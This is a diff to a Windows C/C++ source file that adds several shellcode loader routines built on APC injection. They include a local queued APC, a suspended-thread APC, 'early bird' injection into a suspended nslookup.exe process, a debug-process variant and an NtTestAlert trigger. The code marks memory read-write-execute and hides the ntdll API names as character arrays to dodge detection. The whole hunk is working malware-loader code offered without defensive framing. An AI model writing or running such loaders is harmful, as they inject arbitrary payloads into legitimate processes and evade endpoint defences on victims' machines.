@@ -23,6 +23,105 @@ typedef NTSTATUS (NTAPI* pNtWriteVirtualMemory)(
 	IN ULONG                NumberOfBytesToWrite,
 	OUT PULONG              NumberOfBytesWritten OPTIONAL);
 
+
+typedef NTSTATUS(NTAPI* pNtTestAlert)(
+	);
+
+void test() {
+	printf("111");
+}
+
+
+
+void AlertApc() {
+	DWORD dwOldProtection = NULL;
+	LPVOID lpMem = NULL;
+
+
+
+	lpMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	memcpy(lpMem, shellcode, sizeof(shellcode));
+	VirtualProtect(lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
+	QueueUserAPC((PAPCFUNC)lpMem, GetCurrentThread(), 0);
+
+	SleepEx(INFINITE, 1);
+}
+void suspendApc() {
+
+
+	DWORD dwOldProtection = NULL;
+	LPVOID lpMem = NULL;
+
+	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&test, NULL, CREATE_SUSPENDED, NULL);
+	lpMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	memcpy(lpMem, shellcode, sizeof(shellcode));
+	VirtualProtect(lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
+	QueueUserAPC((PAPCFUNC)lpMem, hThread, 0);
+
+	ResumeThread(hThread);
+	WaitForSingleObject(hThread, -1);
+
+}
+void earlyBirdApc() {
+
+	STARTUPINFO si = { sizeof(STARTUPINFO) };
+	PROCESS_INFORMATION pi;
+	LPVOID lpMem;
+	ULONG dwBytesWritten;
+	DWORD dwOldProtection;
+
+	char str1[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
+	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);
+
+	CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	lpMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	NtWriteVirtualMemory(pi.hProcess, lpMem, shellcode, sizeof(shellcode), &dwBytesWritten);
+	VirtualProtectEx(pi.hProcess, lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
+
+	QueueUserAPC((PAPCFUNC)lpMem, pi.hThread, 0);
+
+	ResumeThread(pi.hThread);
+	WaitForSingleObject(pi.hThread, -1);
+
+}
+void earlyBirdDebugApc() {
+
+	STARTUPINFO si = { sizeof(STARTUPINFO) };
+	PROCESS_INFORMATION pi;
+	LPVOID lpMem;
+	ULONG dwBytesWritten;
+	DWORD dwOldProtection;
+
+	char str1[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
+	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);
+
+	CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, false, DEBUG_PROCESS, NULL, NULL, &si, &pi);
+	lpMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	NtWriteVirtualMemory(pi.hProcess, lpMem, shellcode, sizeof(shellcode), &dwBytesWritten);
+	VirtualProtectEx(pi.hProcess, lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
+
+	QueueUserAPC((PAPCFUNC)lpMem, pi.hThread, 0);
+
+	DebugActiveProcessStop(pi.dwProcessId);
+
+}
+void ntAlertApc() {
+	char str1[] = { 'N','t','T','e','s','t','A','l','e','r','t','\0' };
+	pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);
+
+	DWORD dwOldProtection = NULL;
+	LPVOID lpMem = NULL;
+
+	lpMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	memcpy(lpMem, shellcode, sizeof(shellcode));
+	VirtualProtect(lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
+	QueueUserAPC((PAPCFUNC)lpMem, GetCurrentThread(), 0);
+
+
+	NtTestAlert();
+
+}
+
 void callBackExec() {
 	DWORD dwOldProtection;
 
